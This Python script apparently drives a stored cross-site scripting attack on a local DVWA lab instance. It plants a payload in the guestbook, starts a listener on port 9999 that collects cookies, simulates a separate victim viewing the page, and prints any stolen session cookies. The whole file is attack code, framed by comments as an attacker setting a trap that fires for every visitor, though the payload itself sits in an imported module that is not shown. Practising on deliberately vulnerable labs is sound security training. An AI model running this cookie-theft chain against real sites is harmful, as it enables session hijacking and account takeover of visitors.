from modules.crawler import Crawler
from modules.cookie_theft import CookieTheftExploit
import requests
import time

# Step 1: log in as admin, submit the malicious payload to the
# STORED XSS guestbook — this simulates an attacker planting the trap
attacker_crawler = Crawler("http://127.0.0.1")
attacker_crawler.login()
attacker_crawler.set_security_level("low")

exploit = CookieTheftExploit(capture_port=9999)
exploit.start_capture_server()

payload = exploit.build_payload()
print(f"Submitting stored XSS payload to guestbook...")

attacker_crawler.session.post(
    "http://127.0.0.1/vulnerabilities/xss_s/",
    data={"txtName": "attacker", "mtxMessage": payload, "btnSign": "Sign Guestbook"},
    timeout=10
)

# Step 2: simulate a COMPLETELY SEPARATE victim (fresh session, fresh
# login) simply viewing the guestbook page normally — this is the
# realistic attack scenario: the payload fires automatically for
# ANY user who visits, without them doing anything malicious themselves
print(f"\nSimulating a separate victim viewing the guestbook page...")

victim_crawler = Crawler("http://127.0.0.1")
victim_crawler.login(username="admin", password="password")  # DVWA only has one real login
victim_crawler.session.get("http://127.0.0.1/vulnerabilities/xss_s/", timeout=10)

time.sleep(2)

if exploit.captured_cookies:
    print(f"\n[!] EXPLOIT SUCCESSFUL")
    for c in exploit.captured_cookies:
        print(f"    Stolen cookie: {c['cookie']}")
else:
    print(f"\n[?] No cookie captured")
